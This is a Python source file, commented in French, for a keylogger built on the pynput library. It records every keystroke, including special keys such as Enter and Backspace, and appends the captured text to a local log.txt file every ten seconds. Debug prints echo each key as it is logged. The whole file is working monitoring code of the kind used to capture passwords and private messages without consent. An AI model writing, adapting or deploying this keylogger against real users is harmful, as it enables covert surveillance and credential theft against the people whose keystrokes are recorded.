from pynput import keyboard
import threading
import os

# Variable globale pour stocker les touches pressées
log = ""
# Chemin vers le fichier log.txt
path = "log.txt"

# Fonction pour traiter chaque touche pressée
def processkeys(key):
    global log
    try:
        # Si c'est un caractère imprimable, on l'ajoute à la chaîne log
        log += str(key.char)
        print(f"Touche appuyée (char): {key.char}")  # Debug: affichage de la touche
    except AttributeError:
        # Gérer les touches spéciales comme espace, enter, backspace
        if key == keyboard.Key.space:
            log += " "
            print("Espace appuyé")  # Debug: affichage pour la touche espace
        elif key == keyboard.Key.enter:
            log += "\n"
            print("Entrée appuyée")  # Debug: affichage pour la touche entrée
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"
            print("Backspace appuyé")  # Debug: affichage pour la touche backspace
        else:
            # Pour toutes les autres touches (flèches, etc.), ne rien ajouter
            log += ""
            print(f"Touche spéciale non gérée: {key}")  # Debug: touches spéciales

# Fonction pour enregistrer les frappes dans un fichier log
def report():
    global log, path
    try:
        # Ouvre le fichier log.txt en mode ajout (append)
        with open(path, "a") as logfile:
            logfile.write(log)
            print(f"Frappes enregistrées dans {path}: {log}")  # Debug: contenu enregistré
            log = ""  # Réinitialiser log après l'enregistrement
    except Exception as e:
        print(f"Erreur lors de l'écriture dans le fichier: {e}")  # Debug: gestion des erreurs
    # Planifie un nouvel appel à report toutes les 10 secondes
    threading.Timer(10, report).start()

# Démarre l'écoute des touches
keyboard_listener = keyboard.Listener(on_press=processkeys)

# Appeler report pour démarrer le cycle d'enregistrement
print("Démarrage du keylogger")  # Debug: indication du début de l'enregistrement
report()

# Démarrer l'écoute du clavier
with keyboard_listener:
    print("Écoute du clavier en cours...")  # Debug: écoute activée
    keyboard_listener.join()
